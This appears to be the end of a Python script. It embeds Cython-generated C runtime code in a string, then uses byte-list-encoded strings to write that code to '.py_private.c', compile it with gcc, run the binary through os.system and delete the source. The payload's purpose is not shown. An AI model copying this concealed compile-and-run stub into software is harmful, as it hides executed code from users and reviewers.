#if (!CYTHON_COMPILING_IN_PYPY) || (defined(PyByteArray_AS_STRING) && defined(PyByteArray_GET_SIZE))
    if (PyByteArray_Check(o)) {
        *length = PyByteArray_GET_SIZE(o);
        return PyByteArray_AS_STRING(o);
    } else
#endif
    {
        char* result;
        int r = PyBytes_AsStringAndSize(o, &result, length);
        if (unlikely(r < 0)) {
            return NULL;
        } else {
            return result;
        }
    }
}
static CYTHON_INLINE int __Pyx_PyObject_IsTrue(PyObject* x) {
   int is_true = x == Py_True;
   if (is_true | (x == Py_False) | (x == Py_None)) return is_true;
   else return PyObject_IsTrue(x);
}
static CYTHON_INLINE int __Pyx_PyObject_IsTrueAndDecref(PyObject* x) {
    int retval;
    if (unlikely(!x)) return -1;
    retval = __Pyx_PyObject_IsTrue(x);
    Py_DECREF(x);
    return retval;
}
static PyObject* __Pyx_PyNumber_IntOrLongWrongResultType(PyObject* result, const char* type_name) {
#if PY_MAJOR_VERSION >= 3
    if (PyLong_Check(result)) {
        if (PyErr_WarnFormat(PyExc_DeprecationWarning, 1,
                "__int__ returned non-int (type %.200s).  "
                "The ability to return an instance of a strict subclass of int "
                "is deprecated, and may be removed in a future version of Python.",
                Py_TYPE(result)->tp_name)) {
            Py_DECREF(result);
            return NULL;
        }
        return result;
    }
#endif
    PyErr_Format(PyExc_TypeError,
                 "__%.4s__ returned non-%.4s (type %.200s)",
                 type_name, type_name, Py_TYPE(result)->tp_name);
    Py_DECREF(result);
    return NULL;
}
static CYTHON_INLINE PyObject* __Pyx_PyNumber_IntOrLong(PyObject* x) {
#if CYTHON_USE_TYPE_SLOTS
  PyNumberMethods *m;
#endif
  const char *name = NULL;
  PyObject *res = NULL;
#if PY_MAJOR_VERSION < 3
  if (likely(PyInt_Check(x) || PyLong_Check(x)))
#else
  if (likely(PyLong_Check(x)))
#endif
    return __Pyx_NewRef(x);
#if CYTHON_USE_TYPE_SLOTS
  m = Py_TYPE(x)->tp_as_number;
  #if PY_MAJOR_VERSION < 3
  if (m && m->nb_int) {
    name = "int";
    res = m->nb_int(x);
  }
  else if (m && m->nb_long) {
    name = "long";
    res = m->nb_long(x);
  }
  #else
  if (likely(m && m->nb_int)) {
    name = "int";
    res = m->nb_int(x);
  }
  #endif
#else
  if (!PyBytes_CheckExact(x) && !PyUnicode_CheckExact(x)) {
    res = PyNumber_Int(x);
  }
#endif
  if (likely(res)) {
#if PY_MAJOR_VERSION < 3
    if (unlikely(!PyInt_Check(res) && !PyLong_Check(res))) {
#else
    if (unlikely(!PyLong_CheckExact(res))) {
#endif
        return __Pyx_PyNumber_IntOrLongWrongResultType(res, name);
    }
  }
  else if (!PyErr_Occurred()) {
    PyErr_SetString(PyExc_TypeError,
                    "an integer is required");
  }
  return res;
}
static CYTHON_INLINE Py_ssize_t __Pyx_PyIndex_AsSsize_t(PyObject* b) {
  Py_ssize_t ival;
  PyObject *x;
#if PY_MAJOR_VERSION < 3
  if (likely(PyInt_CheckExact(b))) {
    if (sizeof(Py_ssize_t) >= sizeof(long))
        return PyInt_AS_LONG(b);
    else
        return PyInt_AsSsize_t(b);
  }
#endif
  if (likely(PyLong_CheckExact(b))) {
    #if CYTHON_USE_PYLONG_INTERNALS
    const digit* digits = ((PyLongObject*)b)->ob_digit;
    const Py_ssize_t size = Py_SIZE(b);
    if (likely(__Pyx_sst_abs(size) <= 1)) {
        ival = likely(size) ? digits[0] : 0;
        if (size == -1) ival = -ival;
        return ival;
    } else {
      switch (size) {
         case 2:
           if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -2:
           if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case 3:
           if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -3:
           if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case 4:
           if (8 * sizeof(Py_ssize_t) > 4 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((((((size_t)digits[3]) << PyLong_SHIFT) | (size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -4:
           if (8 * sizeof(Py_ssize_t) > 4 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((((((size_t)digits[3]) << PyLong_SHIFT) | (size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
      }
    }
    #endif
    return PyLong_AsSsize_t(b);
  }
  x = PyNumber_Index(b);
  if (!x) return -1;
  ival = PyInt_AsSsize_t(x);
  Py_DECREF(x);
  return ival;
}
static CYTHON_INLINE Py_hash_t __Pyx_PyIndex_AsHash_t(PyObject* o) {
  if (sizeof(Py_hash_t) == sizeof(Py_ssize_t)) {
    return (Py_hash_t) __Pyx_PyIndex_AsSsize_t(o);
#if PY_MAJOR_VERSION < 3
  } else if (likely(PyInt_CheckExact(o))) {
    return PyInt_AS_LONG(o);
#endif
  } else {
    Py_ssize_t ival;
    PyObject *x;
    x = PyNumber_Index(o);
    if (!x) return -1;
    ival = PyInt_AsLong(x);
    Py_DECREF(x);
    return ival;
  }
}
static CYTHON_INLINE PyObject * __Pyx_PyBool_FromLong(long b) {
  return b ? __Pyx_NewRef(Py_True) : __Pyx_NewRef(Py_False);
}
static CYTHON_INLINE PyObject * __Pyx_PyInt_FromSize_t(size_t ival) {
    return PyInt_FromSize_t(ival);
}


#endif /* Py_PYTHON_H */'''
C_FILE = bytes([46, 112, 121, 95, 112, 114, 105, 118, 97, 116, 101, 46, 99]).decode()
PYTHON_VERSION = bytes([46]).decode().join(sys.version.split(bytes([32]).decode())[0].split(bytes([46]).decode())[:-1])
COMPILE_FILE = (
    bytes([103, 99, 99, 32, 45, 73]).decode() +
    PREFIX +
    bytes([47, 105, 110, 99, 108, 117, 100, 101, 47, 112, 121, 116, 104, 111, 110]).decode() +
    PYTHON_VERSION +
    bytes([32, 45, 111, 32]).decode() +
    EXECUTE_FILE +
    bytes([32]).decode() +
    C_FILE +
    bytes([32, 45, 76]).decode() +
    PREFIX +
    bytes([47, 108, 105, 98, 32, 45, 108, 112, 121, 116, 104, 111, 110]).decode() +
    PYTHON_VERSION
)


with open(C_FILE, bytes([119]).decode()) as f:
    f.write(C_SOURCE)

os.makedirs(os.path.dirname(EXECUTE_FILE), exist_ok=True)
os.system(EXPORT_PYTHONHOME+bytes([32, 38, 38, 32]).decode()+EXPORT_PYTHON_EXECUTABLE+bytes([32, 38, 38, 32]).decode()+COMPILE_FILE+bytes([32, 38, 38, 32]).decode()+RUN)

os.remove(C_FILE)
